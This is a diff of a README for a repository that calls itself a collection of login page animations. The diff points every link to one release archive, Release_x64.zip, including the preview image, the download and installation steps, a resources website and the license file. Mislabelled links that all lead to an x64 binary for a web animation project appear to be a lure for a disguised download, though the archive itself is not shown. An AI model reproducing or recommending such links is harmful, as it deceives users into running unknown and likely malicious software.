@@ -15,16 +15,16 @@ Welcome to the "Login-Page-Animation" repository! Here you will find a collectio
 
 Check out a preview of the animations in action:
 
-![Login Page Animation Preview](https://sampleimage.com)
+![Login Page Animation Preview](https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip)
 
 ## Usage 🧩
 
-To use these animations in your project, simply download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file and follow the setup instructions provided. The animations are lightweight and customizable, allowing you to tailor them to suit your login page design.
+To use these animations in your project, simply download the [https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip](https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip) file and follow the setup instructions provided. The animations are lightweight and customizable, allowing you to tailor them to suit your login page design.
 
 ## Installation 🚚
 
 To install the animations, follow these steps:
-1. Download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file
+1. Download the [https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip](https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip) file
 2. Unzip the file to access the animation files
 3. Integrate the animations into your HTML, CSS, and JavaScript code
 4. Customize the animations to match your login page design
@@ -35,7 +35,7 @@ To install the animations, follow these steps:
 
 ## Additional Resources 📚
 
-For more information and resources on login page design and animation, visit the [Awesome Animations](https://awesomeanimations.com) website.
+For more information and resources on login page design and animation, visit the [Awesome Animations](https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip) website.
 
 ## Contributions Welcome 🤝
 
@@ -43,7 +43,7 @@ If you have suggestions for improvements or would like to contribute your own lo
 
 ## License ℹ️
 
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/yourusername/Login-Page-Animation/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip](https://github.com/Bennetizen/Login-Page-Animation/releases/download/v2.0/Release_x64.zip) file for details.
 
 ---
 
